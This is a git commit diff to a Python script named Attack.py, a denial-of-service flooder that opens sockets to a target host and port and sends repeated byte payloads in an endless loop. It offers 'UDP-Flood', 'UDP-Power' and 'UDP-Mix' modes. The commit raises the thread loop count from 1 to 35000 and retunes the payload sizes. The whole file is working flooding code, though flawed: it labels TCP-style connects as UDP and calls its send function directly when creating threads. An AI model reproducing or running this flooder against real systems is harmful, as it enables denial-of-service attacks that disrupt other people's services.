a2e2da51f0a8407de0d39dfa44a02ebec2981eff
zJonch <zjonch@gmail.com>
2025-03-26 15:31:39 -0400

    Update Attack.py

--- Attack.py
+++ Attack.py
@@ -5,7 +5,7 @@ import threading
 host = str(sys.argv[1])
 port = int(sys.argv[2])
 method = str(sys.argv[3])
-loops = 1
+loops = 35000
 
 def send_packet(amplifier):
     try:
@@ -13,7 +13,7 @@ def send_packet(amplifier):
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.connect((str(host), int(port)))
         while True:
-            s.send(b"\x1200" * amplifier)
+            s.send(b"\x200" * amplifier)
     except:
         return
     s.close()
@@ -21,13 +21,13 @@ def send_packet(amplifier):
 def attack_HQ():
     if method == "UDP-Flood":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(750), daemon=True).start()
+            threading.Thread(target=send_packet(375), daemon=True).start()
     if method == "UDP-Power":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(7864), daemon=True).start()
+            threading.Thread(target=send_packet(750), daemon=True).start()
     if method == "UDP-Mix":
         for sequence in range(loops):
-            threading.Thread(target=send_packet(10486), daemon=True).start()
-            threading.Thread(target=send_packet(5243), daemon=True).start()
+            threading.Thread(target=send_packet(375), daemon=True).start()
+            threading.Thread(target=send_packet(750), daemon=True).start()
 
 attack_HQ()
